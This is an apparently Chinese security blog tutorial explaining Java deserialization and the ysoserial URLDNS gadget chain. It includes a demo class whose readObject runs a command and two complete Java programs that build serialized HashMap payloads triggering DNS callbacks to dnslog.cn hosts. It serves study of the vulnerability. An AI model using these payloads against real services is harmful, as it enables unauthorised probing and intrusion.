###  java 反序列化之----URLDNS反序列化链

## 说明

此篇记录Java 反序列化的相关知识

## 1 反序列化介绍

一个类想要实现序列化和反序列化，必须要实现 `java.io.Serializable` 或 `java.io.Externalizable` 接口。

Serializable 接口是一个标记接口，标记了这个类可以被序列化和反序列化，而 Externalizable 接口在 Serializable 接口基础上，又提供了 `writeExternal` 和 `readExternal` 方法，用来序列化和反序列化一些外部元素。

其中，**如果被序列化的类重写了 writeObject 和 readObject 方法，Java 将会委托使用这两个方法来进行序列化和反序列化的操作。**

正是因为这个特性，导致反序列化漏洞的出现：**在反序列化一个类时，如果其重写了 `readObject` 方法，程序将会调用它，如果这个方法中存在一些恶意的调用，则会对应用程序造成危害。**

### 1.1 demo

一个简单的测试程序

```java
public class Person implements Serializable {

	private String name;

	private int age;

	public Person(String name, int age) {
		this.name = name;
		this.age = age;
	}

	private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException {
		Runtime.getRuntime().exec("calc");
	}

}
```

然后我们将这个类序列化并写在文件中，随后对其进行反序列化，就触发了命令执行。

```java
public class SerializableTest {

	public static void main(String[] args) throws IOException, ClassNotFoundException {
		Person person = new Person("zhangsan", 24);

		ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("abc.txt"));
		oos.writeObject(person);
		oos.close();


		FileInputStream   fis = new FileInputStream("abc.txt");
		ObjectInputStream ois = new ObjectInputStream(fis);
		ois.readObject();
		ois.close();
	}
}

```

### 1.2 分析

那么为什么重写了就会执行呢？我们来看一下 `java.io.ObjectInputStream#readObject()` 方法的具体实现代码。

`readObject` 方法实际调用 `readObject0` 方法反序列化字符串。

![img](https://gitee.com/shine05/myblog-gallery/raw/master/img/1621558808758.png)

`readObject0` 方法以字节的方式去读，如果读到 `0x73`，则代表这是一个对象的序列化数据，将会调用 `readOrdinaryObject` 方法进行处理

![img](https://gitee.com/shine05/myblog-gallery/raw/master/img/1621558936988.png)

`readOrdinaryObject` 方法会调用 `readClassDesc` 方法读取类描述符，并根据其中的内容判断类是否实现了 Externalizable 接口，如果是，则调用 `readExternalData` 方法去执行反序列化类中的 `readExternal`，如果不是，则调用 `readSerialData` 方法去执行类中的 `readObject` 方法。

![img](https://gitee.com/shine05/myblog-gallery/raw/master/img/1621559285632.png)

在 `readSerialData` 方法中，首先通过类描述符获得了序列化对象的数据布局。通过布局的 `hasReadObjectMethod` 方法判断对象是否有重写 `readObject` 方法，如果有，则使用 `invokeReadObject` 方法调用对象中的 `readObject` 。

![img](https://gitee.com/shine05/myblog-gallery/raw/master/img/1621559702145.png)

通过上述分析，我们就了解了反序列化漏洞的触发原因。与反序列漏洞的触发方式相同，在序列化时，如果一个类重写了 `readObject` 方法，并且其中产生恶意调用，则将会导致漏洞，当然在实际环境中，序列化的数据来自不可信源的情况比较少见。

那接下来该如何利用呢？我们需要找到那些类重写了 `readObject` 方法，并且找到相关的调用链，能够触发漏洞，接下来，我们将分析 ysoserial 中的调用链，积累一些思路。



## 2.DNS log反序列化

### 2.1 dnslog的demo

```
        URL url = new URL("http://hw54so.dnslog.cn");
        url.hashCode();
```

![image-20221004160125079](https://gitee.com/shine05/myblog-gallery/raw/master/img/image-20221004160125079.png)

通过上述的调用方式可以发现成功触发了dns log的查询操作，因此咱们如果利用反序列化，则可以通过url.hashcode()方式来触发该反序列化查询操作。



### 2.2 HashMap 说明

也是 URLDNS gadget 的主角 —— `java.util.HashMap`

直接看HashMap的代码：HashMap有个readObject方法，因此在反序列化的过程中会直接调用该方法的readobject的方法。

![image-20221004162009880](https://gitee.com/shine05/myblog-gallery/raw/master/img/image-20221004162009880.png)

```java
private void readObject(ObjectInputStream s)
        throws IOException, ClassNotFoundException {

        ObjectInputStream.GetField fields = s.readFields();

        // Read loadFactor (ignore threshold)
        float lf = fields.get("loadFactor", 0.75f);
        if (lf <= 0 || Float.isNaN(lf))
            throw new InvalidObjectException("Illegal load factor: " + lf);

        lf = Math.min(Math.max(0.25f, lf), 4.0f);
        HashMap.UnsafeHolder.putLoadFactor(this, lf);

        reinitialize();

        s.readInt();                // Read and ignore number of buckets
        int mappings = s.readInt(); // Read number of mappings (size)
        if (mappings < 0) {
            throw new InvalidObjectException("Illegal mappings count: " + mappings);
        } else if (mappings == 0) {
            // use defaults
        } else if (mappings > 0) {
            float fc = (float)mappings / lf + 1.0f;
            int cap = ((fc < DEFAULT_INITIAL_CAPACITY) ?
                       DEFAULT_INITIAL_CAPACITY :
                       (fc >= MAXIMUM_CAPACITY) ?
                       MAXIMUM_CAPACITY :
                       tableSizeFor((int)fc));
            float ft = (float)cap * lf;
            threshold = ((cap < MAXIMUM_CAPACITY && ft < MAXIMUM_CAPACITY) ?
                         (int)ft : Integer.MAX_VALUE);

            // Check Map.Entry[].class since it's the nearest public type to
            // what we're actually creating.
            SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);
            @SuppressWarnings({"rawtypes","unchecked"})
            Node<K,V>[] tab = (Node<K,V>[])new Node[cap];
            table = tab;

            // Read the keys and values, and put the mappings in the HashMap
            for (int i = 0; i < mappings; i++) {
                @SuppressWarnings("unchecked")
                    K key = (K) s.readObject();
                @SuppressWarnings("unchecked")
                    V value = (V) s.readObject();
                putVal(hash(key), key, value, false, false);
            }
        }
    }
```

 HashMap 的 `readObject` 方法，省略掉前面各种初始化的代码，将序列化对象中的键值进行 for 循环，并调用里面的 key 和 value 对象的 `readObject` 方法反序列化 key 和 value 的值后，使用 `putVal` (1.7 是 `putForCreate` 方法) 将这些键、值以及相关的 hash 等信息写入 HashMap 的属性 table 中。

我们重点看下`putVal(hash(key), key, value, false, false);`

发现此处调用的方法如下，直接调用了 key.hashCode() 

`putVal` 方法就是 `Map#put` 以及相关方法的有关实现，有 5 个参数，分别是 hash 值，key 对象 ，value 对象和两个布尔参数，其中的 hash ，key ，value 就是用于创建 Node 对象的相关属性。

HashMap 通过一个静态方法 `hash` 计算 key 对象的 hash 值，如果 key 为 null， 则值为 0 ，否则将调用 key 的 hashCode 方法计算 hashCode 值，再和位移 16 位的结果进行异或得出 hash 值。

![image-20221004162251276](https://gitee.com/shine05/myblog-gallery/raw/master/img/image-20221004162251276.png)

结合上述两点，咱们如果设置为key为url，则在序列化过程中会直接调用key.hashCode()---> url.hashCode()--->触发dns的请求。

按理说这么做已经结束了，但是，咱们再看下 url.hashCode();方法，跟进看下该方法的实现：

![image-20221004163032785](https://gitee.com/shine05/myblog-gallery/raw/master/img/image-20221004163032785.png)

在正常调用url.hashCode();  该hashCode值默认为-1，代码自动给我们赋值为-1，但是如果直接进行反序列化过程中，由于没有上下文，因此无法获取到该`hashCode`值，因此无法直接进行反序列化。

### 2.3 hashCode说明

在 URL 对象有一个属性 hashCode，默认是 -1，使用`hashCode` 方法计算时会在 hashCode 属性中缓存已经计算过的值，如果再次计算将直接返回值，不会在触发 URLStreamHandler 的 `hashCode` 方法，也就不会触发漏洞。所以我们需要在生成的 HashMap 中的 URL 参数的 hashCode 值在反序列化时为 -1，而刚才说过，如果使用 put 方法，会调用一次 key 的 hash 计算，也就是 URL 的 `hashCode` 方法，这样就把 hashCode 缓存了，在反序列化时就不会触发 URLStreamHandler 的 `hashCode` 方法以及后面的逻辑，所以有两种思路解决这个问题：

- 如果使用 HashMap 的 `put` 方法，将 URL 对象放入 Map 的 key 中之前，先将其 URL 对象 hashCode 进行修改，使其不等于 -1，这样就不会触发 DNS 查询，放入之后，再使用反射将 URL 对象中的 hashCode 修改为 -1，反序列化的时候就可以正常触发了。

  ![image-20221004170157178](https://gitee.com/shine05/myblog-gallery/raw/master/img/image-20221004170157178.png)

  

- 直接反射调用 HashMap 的 `putVal` 方法绕过 hash 计算。（由于 JDK 1.7 中方法名不一样，细节也不一样，所以不具有通用性）



第一种思路的代码实现：

```java
public class URLDNS {

	public static void main(String[] args) throws Exception {

		HashMap<URL, Integer> hashMap = new HashMap<>();
		URL                   url     = new URL("http://8de0ko.dnslog.cn");
		Field                 f       = Class.forName("java.net.URL").getDeclaredField("hashCode");
		f.setAccessible(true);  #由于hashCode  定义为： private int hashCode = -1; ，因此需要设置setAccessible
		f.set(url, 0x01010101);
		hashMap.put(url, 0);
		f.set(url, -1);
		ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("urldns.bin"));
		oos.writeObject(hashMap);
		ObjectInputStream ois = new ObjectInputStream(new FileInputStream("urldns.bin"));
		ois.readObject();
	}
}
```

第二种思路的代码实现：

```java
public class URLDNS2 {

	public static void main(String[] args) throws Exception {

		HashMap<URL, Integer> hashMap = new HashMap<>();
		URL                   url     = new URL("http://8de0ko.dnslog.cn");
		Method[] m = Class.forName("java.util.HashMap").getDeclaredMethods();
		for (Method method : m) {
			if (method.getName().equals("putVal")) {
				method.setAccessible(true);
				method.invoke(hashMap, -1, url, 0, false, true);
			}
		}
		ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("urldns2.bin"));
		oos.writeObject(hashMap);
		ObjectInputStream ois = new ObjectInputStream(new FileInputStream("urldns2.bin"));
		ois.readObject();
	}
}
```

以上两种都可以成功触发 DNS 查询









## 参考

1、[反序列化Gadget学习篇一 URLDNS - ChanGeZ - 博客园 (cnblogs.com)](https://www.cnblogs.com/chengez/p/urldns.html)

2、https://su18.org/post/ysoserial-su18-1/





